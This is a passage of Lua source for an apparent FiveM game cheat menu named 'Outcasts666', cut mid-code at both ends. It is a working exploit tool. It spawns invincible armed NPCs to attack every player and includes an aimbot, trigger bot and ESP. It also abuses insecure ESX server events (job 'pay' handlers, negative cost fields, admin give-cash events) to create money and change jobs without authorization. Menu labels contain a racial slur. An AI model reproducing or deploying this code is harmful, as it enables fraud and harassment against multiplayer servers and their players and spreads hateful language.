                            local coords = GetEntityCoords(GetPlayerPed(i))
                            local ped = CreatePed(29, model, coords.x, coords.y, coords.z + 1.0, 1, true, true)
                            TaskCombatPed(ped,GetPlayerPed(i),0,16)
                        end    
                    elseif Outcasts666.Button("Alien With Ak") then
                        local model = 1684083350
                        while not HasModelLoaded(model) do
                            debugPrint("Loading Model...")
                            RequestModel(model)
                            Citizen.Wait(0)
                        end
                        for i = 1, 128 do
                            local coords = GetEntityCoords(GetPlayerPed(i))
                            local ped = CreatePed(21, model, coords.x, coords.y, coords.z + 1.0, 1, true, true)
                            if DoesEntityExist(ped) then
                                GiveWeaponToPed(ped,GetHashKey("WEAPON_ASSAULTRIFLE"),9999,1,1)
                                SetEntityInvincible(ped,true)
                                SetPedCanSwitchWeapon(ped,true)
                                TaskCombatPed(ped,GetPlayerPed(i),0,16)
                            end
                        end    
                    end
                
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("TeleportMenu") then
                    if Outcasts666.Button("Teleport To Waypoint") then
                        TeleportToWaypoint()
                    elseif Outcasts666.Button("Teleport Into Nearest Vehicle") then
                        teleportToNearestVehicle()
                    elseif Outcasts666.Button("Teleport To Coords") then
                        TeleportToCoords()
                    elseif Outcasts666.CheckBox(
                        "Show Coords",
                        showCoords,
                        function(enabled)
                            showCoords = enabled
                        end)
                    then
                    elseif Outcasts666.Button("Draw Custom Blip") then
                        bk()
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("VehMenu") then
                    if Outcasts666.Button("Repair Vehicle") then
                        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    elseif Outcasts666.Button("Spawn Custom Vehicle") then
                        local ped = GetPlayerPed(-1)
                            local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)   
                            if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                                RequestModel(ModelName)
                                while not HasModelLoaded(ModelName) do
                                    Citizen.Wait(0)
                                end
                                if DelCurVeh and IsPedInAnyVehicle(ped, true) then
                                    local vehicle = GetVehiclePedIsUsing(GetPlayerPed(-1))
                                    SetEntityAsMissionEntity(vehicle, true, true)
                                    DeleteVehicle(vehicle)
                                end
                                local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                                if SpawnInVeh then
                                    SetPedIntoVehicle(ped, veh, -1)
                                end
                            else
                                drawNotification("~r~Model is not valid!")
                            end
                    elseif Outcasts666.MenuButton("∑Vehicle Spawner", "CarTypes") then
                    elseif Outcasts666.MenuButton("∑Spawn options", "VehSpawnOpt") then
                    elseif Outcasts666.MenuButton("∑Nigger Customs", "NiggerCustoms") then
                    elseif Outcasts666.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                    elseif Outcasts666.Button("Delete Closest Vehicle") then
                        local PlayerCoords = GetEntityCoords(PlayerPedId())
                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
                    end
    
                    Outcasts666.Display() 
                elseif Outcasts666.IsMenuOpened("CarTypes") then
                    for i, e3 in ipairs(aX) do
                        if Outcasts666.MenuButton("∑ "..e3, "CarTypeSelection") then 
                            carTypeIdx = i 
                        end 
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("CarTypeSelection") then
                    for i, e3 in ipairs(aY[carTypeIdx]) do
                        if Outcasts666.MenuButton("∑ "..e3, "CarOptions") then 
                            carToSpawn = i 
                        end 
                    end
    
                    Outcasts666.Display() 
                elseif Outcasts666.IsMenuOpened("CarOptions") then
                    if Outcasts666.Button("Spawn Car") then 
                        local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 0.0, 0.5)) 
                        local veh = aY[carTypeIdx][carToSpawn]
                    if veh == nil then 
                        veh = "adder"
                    end
                    vehiclehash = GetHashKey(veh) 
                    RequestModel(vehiclehash) 
                    Citizen.CreateThread(function() 
                        local e4 = 0
                        while not HasModelLoaded(vehiclehash) do 
                            e4 = e4 + 100
                            Citizen.Wait(100) 
                            if e4 > 5000 then
                                ShowNotification("~r~Cannot spawn this vehicle.") 
                                break 
                            end 
                        end
                        if DelCurVeh and IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            local vehicle = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            SetEntityAsMissionEntity(vehicle, true, true)
                            DeleteVehicle(vehicle)
                        end
                        SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) 
                        SetVehicleStrong(SpawnedCar, true) 
                        SetVehicleEngineOn(SpawnedCar, true, true, false) 
                        SetVehicleEngineCanDegrade(SpawnedCar, false)
                        if SpawnInVeh then 
                            SetPedIntoVehicle(GetPlayerPed(-1), SpawnedCar, -1) 
                        end
                    end) 
                        end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("NiggerCustoms") then
                    if Outcasts666.CheckBox(
                        "Super Handling",
                        superGrip,
                        function(enabled)
                            superGrip = enabled
                            enchancedGrip = false
                            driftMode = false
                            fdMode = false
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Enchanced Grip",
                        enchancedGrip,
                        function(enabled)
                            superGrip = false
                            enchancedGrip = enabled
                            driftMode = false
                            fdMode = false
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Drift Mode",
                        driftMode,
                        function(enabled)
                            superGrip = false
                            enchancedGrip = false
                            driftMode = enabled
                            fdMode = false
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Formula Drift Mode",
                        fdMode,
                        function(enabled)
                            superGrip = false
                            enchancedGrip = false
                            driftMode = false
                            fdMode = enabled
                        end)
                    then
                    elseif Outcasts666.MenuButton("∑Torque Boost", "VehBoostMenu") then
                    elseif Outcasts666.MenuButton("∑Performance Tuning", "performance") then
                    elseif Outcasts666.MenuButton("∑Exterior Tuning", "tunings") then
                    elseif Outcasts666.Button("Max Tuning") then
                        MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                    elseif Outcasts666.Button("Max Performance") then
                        MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                    end              
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("VehBoostMenu") then
                    if Outcasts666.CheckBox(
                        "Torque Boost 2x",
                        t2x,
                        function(enabled)
                            t2x = enabled
                            t4x = false
                            t8x = false
                            t16x = false
                        end) 
                    then
                    elseif Outcasts666.CheckBox(
                        "Torque Boost 4x",
                        t4x,
                        function(enabled)
                            t2x = false
                            t4x = enabled
                            t8x = false
                            t16x = false
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Torque Boost 8x",
                        t8x,
                        function(enabled)
                            t2x = false
                            t4x = false
                            t8x = enabled
                            t16x = false
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Torque Boost 16x",
                        t16x,
                        function(enabled)
                            t2x = false
                            t4x = false
                            t8x = false
                            t16x = enabled
                        end)
                    then
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("PerformanceMenu") then
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("VehSpawnOpt") then
                    if Outcasts666.CheckBox(
                        "Delete Current Vehicle", 
                        DelCurVeh, 
                        function(enabled) 
                            DelCurVeh = enabled 
                        end)
                    then 
                    elseif Outcasts666.CheckBox(
                        "Spawn In Vehicle",
                        SpawnInVeh,
                        function(enabled)
                            SpawnInVeh = enabled
                        end)
                    then
                    end
                
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("MaliciousMenu") then
                    if Outcasts666.CheckBox(
                        "Crosshair",
                        crosshair,
                        function(enabled)
                            crosshair = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Crosshair 2",
                        crosshair2,
                        function(enabled)
                             crosshair2 = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Crosshair 3",
                        crosshair3,
                        function(enabled)
                            crosshair3 = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox("Name Above Head", nameAboveHead, function(enabled) nameAboveHead = enabled end) then    
                    elseif Outcasts666.CheckBox('~o~Thermal Vision', thermalVision, function(enabled) thermalVision = enabled SetSeethrough(thermalVision) end) then 
                    elseif Outcasts666.CheckBox(
                        "AimBot",
                        aimbot,
                        function(enabled)
                            aimbot = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "ESP",
                        esp,
                        function(enabled)
                            esp = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Trigger Bot",
                        TriggerBot,
                        function(enabled)
                            TriggerBot = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Player Blips",
                        playerBlips,
                        function(enabled)
                            playerBlips = enabled
                        end)
                    then
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("ESXMenu") then
                    if Outcasts666.MenuButton("∑ESX Money Options", "ESXMoneyMenu") then
                    elseif Outcasts666.MenuButton("∑ESX Job Menu", "ESXJobMenu") then
                    elseif Outcasts666.MenuButton("∑ESX Boss", "ESXBossMenu") then
                    elseif Outcasts666.MenuButton("∑ESX Drugs", "ESXDrugs") then
                    elseif Outcasts666.MenuButton("∑ESX Misc", "ESXMiscMenu") then
                    end
                    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("ESXMiscMenu") then
                    if Outcasts666.Button("ESX Harvest FixKit") then
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                    elseif Outcasts666.Button("ESX Craft FixKit") then
                        TriggerServerEvent('esx_mechanicjob:startCraft')
                    elseif Outcasts666.Button("ESX Revive Id") then
                        local id = KeyboardInput("Enter Id", "", 100)
                        TriggerServerEvent("esx_ambulancejob:revive", id)
                    end
                   
            elseif Outcasts666.IsMenuOpened('ESXDrugs') then
                if Outcasts666.Button('~h~~g~Harvest ~g~Weed') then
                    hweed()
                elseif Outcasts666.Button('~h~~g~Transform ~g~Weed') then
                    tweed()
                elseif Outcasts666.Button('~h~~g~Sell ~g~Weed') then
                    sweed()
                elseif Outcasts666.Button('~h~~w~Harvest ~w~Coke') then
                    hcoke()
                elseif Outcasts666.Button('~h~~w~Transform ~w~Coke') then
                    tcoke()
                elseif Outcasts666.Button('~h~~w~Sell ~w~Coke') then
                    scoke()
                elseif Outcasts666.Button('~h~~r~Harvest Meth') then
                    hmeth()
                elseif Outcasts666.Button('~h~~r~Transform Meth') then
                    tmeth()
                elseif Outcasts666.Button('~h~~r~Sell Meth') then
                    smeth()
                elseif Outcasts666.Button('~h~~p~Harvest Opium') then
                    hopi()
                elseif Outcasts666.Button('~h~~p~Transform Opium') then
                    topi()
                elseif Outcasts666.Button('~h~~p~Sell Opium') then
                    sopi()
                elseif Outcasts666.Button("~h~~r~START ~g~Harvest ~s~Rocks") then
                    hrock()
                elseif Outcasts666.Button("~h~~r~START ~y~Wash ~s~Rocks") then
                    wrock()
                elseif Outcasts666.Button("~h~~r~START ~o~Melting ~s~Rocks") then
                    mrock()
                elseif Outcasts666.Button("~h~~r~START ~s~Sell ~o~Copper") then
                    scopper()
                elseif Outcasts666.Button("~h~~r~START ~s~Sell ~g~Iron") then
                    siron()
                elseif Outcasts666.Button("~h~~r~START ~s~Sell ~y~Gold") then
                    sgold()
                elseif Outcasts666.Button("~h~~r~START ~s~Sell ~s~Diamonds") then
                    sdiamonds()
                elseif Outcasts666.Button("~h~~y~Harvest ~s~Bitcoin") then
                    hbtc()
                elseif Outcasts666.Button("~h~~o~Sell ~s~Bitcoin") then
                    sllbtc()
                elseif Outcasts666.Button("~h~~r~STOP ~s~Harvest Bitcoin") then
                    stphbtc()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Sell ~s~Bitcoin") then
                    stpsbtc()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Gas Cans") then
                    hgscan()
                elseif Outcasts666.Button("~h~~y~Craft ~s~LockPick") then
                    clkpk()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Gas Cans") then
                    stphgscan()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~LockPicks") then
                    stpsclkpk()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Repair Tool") then
                    hrtool()
                elseif Outcasts666.Button("~h~~y~Craft ~s~RepairKit") then
                    crkit()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Repair Tool") then
                    stphrtool()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~RepairKit") then
                    stpcrkit()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Body Tool") then
                    hbtool()
                elseif Outcasts666.Button("~h~~y~Craft ~s~BodyKit") then
                    cbkit()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Body Tool") then
                    stphbtool()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~BodyKit") then
                    stpcbkit()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Tyre Toll") then
                    httool()
                elseif Outcasts666.Button("~h~~y~Craft ~s~TyreKit") then
                    ctkit()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Tyre Tool") then
                    stphttool()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~TyreKit") then
                    stpctkit()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Turbo Tool") then
                    htrtool()
                elseif Outcasts666.Button("~h~~y~Craft ~s~TurboKit") then
                    ctrkit()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Turbo Tool") then
                    stphtrtool()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~TurboKit") then
                    stpctrkit()
                elseif Outcasts666.Button("~h~~g~Harvest ~s~Tuning Tool") then
                    htntool()
                elseif Outcasts666.Button("~h~~y~Craft ~s~Tuning Kit") then
                    ctnkit()
                elseif Outcasts666.Button("~h~~r~STOP ~g~Harvest ~s~Tuning Tool") then
                    stphtntool()
                elseif Outcasts666.Button("~h~~r~STOP ~o~Craft ~s~TuningKit") then
                    stpctnkit()
                elseif Outcasts666.Button('~r~~h~Stop all') then
                    matanumaispalarufe()
                elseif Outcasts666.Button('~h~~g~Money Wash') then
                    mataaspalarufe()
                elseif
                    Outcasts666.CheckBox(
                        '~h~~r~Blow Drugs Up ~y~DANGER!',
                        BlowDrugsUp,
                        function(dR)
                            BlowDrugsUp = dR
                        end
                    )
                 then
                end
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("ESXBossMenu") then
                    if Outcasts666.Button("ESX Mechanic Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'mecano',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","mecano",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'mecano',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","mecano",function(dW,dX)
                            Outcasts666.close()end)
                        TriggerEvent("esx_society:openBossMenu",'mecano',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","mecano",function(dY,dZ)
                            Outcasts666.close()
                        end)
                        Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Police Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'police',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","police",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'police',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","police",function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'police',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","police",function(dY,dZ)
                            Outcasts666.close()
                        end)
                        Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Ambulance Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'ambulance',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","ambulance",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'ambulance',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","ambulance",function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'ambulance',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","ambulance",function(dY,dZ)
                            Outcasts666.close()
                        end)
                            Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Taxi Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'taxi',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","taxi",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'taxi',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","taxi",function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'taxi',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","taxi",function(dY,dZ)
                            Outcasts666.close()
                        end)
                            Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Real Estate Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","realestateagent",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","realestateagent",function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","realestateagent",function(dY,dZ)
                            Outcasts666.close()
                        end)
                            Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Car Dealer Boss Menu") then
                        TriggerEvent("esx_society:openBossMenu",'cardealer',function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","cardealer",function(dU,dV)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'cardealer',function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","cardealer",function(dW,dX)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",'cardealer',function(dY,dZ)
                            Outcasts666.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu","cardealer",function(dY,dZ)
                            Outcasts666.close()
                        end)
                            Outcasts666.CloseMenu()
                    elseif Outcasts666.Button("ESX Custom Boss Menu") then
                        local e=KeyboardInput("Enter custom boss menu job name","",100)
                        if e~=""then 
                            TriggerEvent("esx_society:openBossMenu",e,function(dU,dV)
                                Outcasts666.close()
                            end)
                            TriggerEvent("esx_society:openBossMenu",e,function(dW,dX)
                                Outcasts666.close()
                            end)
                            TriggerEvent("esx_society:openBossMenu",e,function(dY,dZ)
                                Outcasts666.close()
                            end)
                            Outcasts666.CloseMenu()
                        end 
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("ESXJobMenu") then
                    if Outcasts666.Button("Unemployed") then
                        TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(-1))
                    elseif Outcasts666.Button("Police") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"police",3)
                    elseif Outcasts666.Button("Mechanic") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"mecano",3)
                    elseif Outcasts666.Button("Taxi") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"taxi",3)
                    elseif Outcasts666.Button("Ambulance") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"ambulance",3)
                    elseif Outcasts666.Button("Real Estate Agent") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"realestateagent",3)
                    elseif Outcasts666.Button("Car Dealer") then
                        TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"cardealer",3)
                    end
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("ESXMoneyMenu") then
                    if Outcasts666.Button('~h~~o~Automatic Money ~r~ WARNING!') then
                    automaticmoneyesx()
                elseif Outcasts666.Button('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'eden_garage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_dmvschool:pay',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif Outcasts666.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_pizza:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ranger:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_truckerjob:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveBank', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveCash', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_banksecurity:pay', m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Airlines Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_airlines:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Brinks Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_brinksjob:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Bus Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_bus:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~CoastGuard Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_coastguard:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Delivery Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_delivererjob:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_garbagejob:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_gopostaljob:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Pizza Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_pizza:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_ranger:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Security Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_securityjob:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Traffic Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_traffic:pay", m)
                    end
				elseif Outcasts666.Button('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent("esx_truckerjob:pay", m)
                    end
                elseif Outcasts666.Button('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    end
                elseif
                    Outcasts666.CheckBox(
                        '~g~~h~ESX Hunting~y~ reward',
                        huntspam,
                        function(dR)
                            huntspam = dR
                        end
                    )
                 then
                end
                
				Outcasts666.Display()
            elseif Outcasts666.IsMenuOpened('MODEL') then
                if Outcasts666.Button('~c~~h~Model~s~ Clown') then
							local model = "s_m_y_clown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mime') then
							local model = "S_M_Y_Mime"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Stripper') then
			local model = "s_f_y_stripper_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Cop M') then
			local model = "s_m_y_cop_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Cop F') then
			local model = "MP_F_Cop_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Sheriff M') then
			local model = "S_M_Y_Sheriff_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Sheriff F') then
			local model = "S_F_Y_Sheriff_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model ~b~SWAT M') then
			local model = "S_M_Y_Swat_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Armoured Ranger M') then
			local model = "S_M_M_Armoured_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
